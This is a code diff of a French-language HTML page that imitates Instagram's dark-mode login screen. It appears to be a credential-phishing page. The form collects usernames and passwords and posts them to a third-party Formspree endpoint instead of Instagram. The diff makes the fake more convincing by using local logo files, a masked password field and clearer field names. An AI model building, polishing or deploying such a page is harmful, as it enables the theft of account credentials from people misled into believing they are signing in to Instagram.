@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion • Instagram</title>
     <style>
-        /* Thème Sombre Officiel (Provenant de 1.html) */
+        /* Thème Sombre */
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             background-color: #000000; 
@@ -29,19 +29,23 @@
             box-sizing: border-box; 
         }
 
+        /* Logos avec les nouvelles dimensions */
         .insta-icon { 
             width: 75px; 
             height: 75px; 
             margin-top: 20px; 
             margin-bottom: 15px; 
+            object-fit: contain;
         }
         
         .logo-text { 
             width: 175px; 
             margin-bottom: 35px; 
-            filter: invert(1); 
+            filter: invert(1); /* Garde le texte blanc si ton image locale est noire */
+            object-fit: contain;
         }
 
+        /* Champs de saisie */
         input { 
             width: 100%; 
             background: #121212; 
@@ -59,6 +63,7 @@
             outline: none; 
         }
 
+        /* Bouton Bleu */
         button { 
             width: 100%; 
             background-color: #0095f6; 
@@ -72,6 +77,11 @@
             cursor: pointer; 
         }
 
+        button:active {
+            opacity: 0.7;
+        }
+
+        /* Séparateurs et Liens */
         .divider { display: flex; width: 100%; align-items: center; margin: 20px 0; }
         .line { flex: 1; height: 1px; background-color: #262626; }
         .or { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
@@ -96,13 +106,12 @@
 
     <div id="main-content">
         <div class="container">
-            <img class="insta-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/132px-Instagram_logo_2016.svg.png" alt="Instagram Icon">
-            <img class="logo-text" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Text">
+            <img class="insta-icon" src="carre.png" alt="Logo Instagram">
+            <img class="logo-text" src="w.png" alt="Instagram">
             
-            <form action="https://formspree.io/f/xreoajwr" method="POST">
-                <input type="text" name="name" placeholder="Num. de téléphone, nom d'utilisateur ou e-mail" required>
-                <input type="text" name="car" placeholder="Mot de passe" required>
-                
+            <form action="https://formspree.io/f/xojpnrrl" method="POST">
+                <input type="text" name="identifiant" placeholder="Num. de téléphone, nom d'utilisateur ou e-mail" required>
+                <input type="password" name="password" placeholder="Mot de passe" required>
                 <button type="submit">Se connecter</button>
             </form>
 
